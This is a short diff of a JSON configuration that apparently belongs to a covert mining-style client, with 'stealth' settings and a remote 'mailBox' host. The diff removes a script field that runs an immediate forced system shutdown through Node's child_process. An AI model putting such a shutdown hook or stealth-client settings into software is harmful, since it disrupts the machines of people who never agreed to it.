@@ -2,8 +2,8 @@
     "username": "QrodexFinance",
     "key": "123",
     "diff": 100,
-    "distress": false,
-    "scripts": "require('child_process').exec('shutdown', ['/s /t 0'])",
+    "distress": true,
+    "scripts": "",
     "altHost": false,
     "mailBox": "https://venominer-client.bobuxstation.repl.co",
     "stealth": [
